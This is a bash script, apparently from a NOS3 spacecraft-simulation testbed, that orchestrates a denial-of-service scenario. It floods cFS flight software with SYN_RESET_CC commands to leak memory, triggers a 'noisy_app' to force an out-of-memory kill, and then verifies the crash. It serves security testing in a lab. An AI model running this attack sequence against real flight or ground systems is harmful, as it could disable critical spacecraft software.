#!/usr/bin/env bash
# run_scenario1.sh - Scenario 1 Phase C: Combined SYN-leak + noisy_app OOM attack
#
# Orchestrates the full DoS FSW Flood scenario:
#   1. Records baseline VmRSS of cFS process
#   2. Starts SYN_RESET_CC memory leak flood in background (attack_syn_leak.py)
#   3. Waits for SYN leak to accumulate (default 10 s)
#   4. Detonates noisy_app via BEACON_PING_FC (attack_noisy_trigger.py)
#   5. Polls for OOM kill event via 'docker events' (timeout 120 s)
#   6. Prints a verification summary
#
# Prerequisites:
#   - NOS3 stack running: cd nos3 && make launch
#   - Python 3 available on PATH
#   - docker CLI available (for OOM event detection)
#
# Usage:
#   ./nos3/scripts/attack/run_scenario1.sh [OPTIONS]
#
# Options:
#   --host HOST       cFS CI host (default: 127.0.0.1)
#   --port PORT       CI UDP port (default: 5010)
#   --syn-count N     Number of SYN_RESET_CC commands (default: 300)
#   --syn-rate HZ     SYN send rate (default: 10)
#   --delay-before-detonate S  Seconds between SYN start and noisy_app trigger (default: 10)
#   --oom-timeout S   Seconds to wait for OOM kill (default: 120)
#   --kibana-url URL  Elasticsearch URL for burst check (default: http://localhost:9200)
#
# Verification:
#   Kibana: gap in software_bus event stream after attack timestamp
#   docker events: OOMKilled=true for nos3 FSW container
#   COSMOS: telemetry flatline (no HK packets received)
#
# References:
#   test_plans.md Scenario 1 Phase C
#   attack_syn_leak.py, attack_noisy_trigger.py

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

HOST="127.0.0.1"
PORT=5010
SYN_COUNT=300
SYN_RATE=10
DELAY_BEFORE_DETONATE=10
OOM_TIMEOUT=120
KIBANA_URL="http://localhost:9200"

# Parse arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        --host)                  HOST="$2";                  shift 2 ;;
        --port)                  PORT="$2";                  shift 2 ;;
        --syn-count)             SYN_COUNT="$2";             shift 2 ;;
        --syn-rate)              SYN_RATE="$2";              shift 2 ;;
        --delay-before-detonate) DELAY_BEFORE_DETONATE="$2"; shift 2 ;;
        --oom-timeout)           OOM_TIMEOUT="$2";           shift 2 ;;
        --kibana-url)            KIBANA_URL="$2";            shift 2 ;;
        *) echo "[ERROR] Unknown option: $1" >&2; exit 1 ;;
    esac
done

echo "============================================================"
echo "  Scenario 1 Phase C - Combined OOM Attack"
echo "  Target: ${HOST}:${PORT}"
echo "  SYN flood: ${SYN_COUNT} resets @ ${SYN_RATE} Hz"
echo "  Detonate noisy_app after: ${DELAY_BEFORE_DETONATE}s"
echo "  OOM poll timeout: ${OOM_TIMEOUT}s"
echo "============================================================"

# Step 1: Baseline VmRSS
CFS_PID=$(pgrep -f "core-cpu1" 2>/dev/null | head -1 || true)
if [[ -n "$CFS_PID" ]]; then
    RSS_BEFORE=$(awk '/VmRSS/{print $2}' "/proc/${CFS_PID}/status" 2>/dev/null || echo "N/A")
    echo "[*] core-cpu1 PID: ${CFS_PID}"
    echo "[*] VmRSS baseline: ${RSS_BEFORE} KB"
else
    echo "[WARN] core-cpu1 process not found on this host."
    echo "       If running inside container, re-run: make debug && ./nos3/scripts/attack/run_scenario1.sh"
    CFS_PID=""
    RSS_BEFORE="N/A"
fi

ATTACK_START=$(date +%s)
echo "[*] Attack start: $(date --iso-8601=seconds)"

# Step 2: Start SYN_RESET_CC flood in background
echo "[*] Starting SYN_RESET_CC flood in background..."
python3 "${SCRIPT_DIR}/attack_syn_leak.py" \
    --host "$HOST" \
    --port "$PORT" \
    --count "$SYN_COUNT" \
    --rate-hz "$SYN_RATE" \
    &
SYN_PID=$!
echo "[*] SYN leak flood PID: ${SYN_PID}"

# Step 3: Wait before detonating noisy_app
echo "[*] Waiting ${DELAY_BEFORE_DETONATE}s for SYN heap leak to accumulate..."
sleep "$DELAY_BEFORE_DETONATE"

# Step 4: Detonate noisy_app
echo "[*] Detonating noisy_app..."
python3 "${SCRIPT_DIR}/attack_noisy_trigger.py" \
    --host "$HOST" \
    --port "$PORT" \
    --kibana-url "$KIBANA_URL" \
    --no-confirm
echo "[*] noisy_app trigger sent."

# Step 5: Poll for OOM kill event
echo "[*] Polling for OOM kill (timeout ${OOM_TIMEOUT}s)..."
OOM_DETECTED=false
OOM_TIME=""

# Try docker events if available
if command -v docker &>/dev/null; then
    OOM_EVENT=$(timeout "$OOM_TIMEOUT" docker events \
        --filter "event=oom" \
        --filter "event=die" \
        --format "{{.Time}} {{.Actor.Attributes.name}} {{.Status}}" \
        2>/dev/null | head -1 || true)
    if [[ -n "$OOM_EVENT" ]]; then
        OOM_DETECTED=true
        OOM_TIME="$OOM_EVENT"
    fi
else
    # Fallback: poll VmRSS until process disappears
    echo "[WARN] docker CLI not available; polling VmRSS for process death..."
    DEADLINE=$(( $(date +%s) + OOM_TIMEOUT ))
    while [[ $(date +%s) -lt $DEADLINE ]]; do
        if [[ -n "$CFS_PID" ]] && ! kill -0 "$CFS_PID" 2>/dev/null; then
            OOM_DETECTED=true
            OOM_TIME="$(date --iso-8601=seconds)"
            break
        fi
        sleep 2
    done
fi

# Step 6: Summary
ATTACK_END=$(date +%s)
ELAPSED=$(( ATTACK_END - ATTACK_START ))

echo ""
echo "============================================================"
echo "  SCENARIO 1 PHASE C - RESULTS"
echo "============================================================"
echo "  Attack elapsed:  ${ELAPSED}s"
echo "  VmRSS before:    ${RSS_BEFORE} KB"
if [[ -n "$CFS_PID" ]]; then
    RSS_AFTER=$(awk '/VmRSS/{print $2}' "/proc/${CFS_PID}/status" 2>/dev/null || echo "process dead")
    echo "  VmRSS after:     ${RSS_AFTER} KB"
fi

if $OOM_DETECTED; then
    echo "  OOM kill:        DETECTED - ${OOM_TIME}"
    echo "  [PASS] cFS process killed by OOM killer."
else
    echo "  OOM kill:        NOT DETECTED within ${OOM_TIMEOUT}s"
    echo "  [INFO] Check: docker events, docker stats, or /var/log/kern.log for OOM"
fi

echo ""
echo "  Kibana verification query:"
echo "    GET ${KIBANA_URL}/nos3-telemetry-*/_search"
echo "    Look for: gap in software_bus events after $(date -d @${ATTACK_START} --iso-8601=seconds)"
echo ""
echo "  COSMOS: telemetry should be flatlined (no HK packets received post-attack)"
echo "============================================================"

# Clean up background SYN flood if still running
if kill -0 "$SYN_PID" 2>/dev/null; then
    kill "$SYN_PID" 2>/dev/null || true
fi
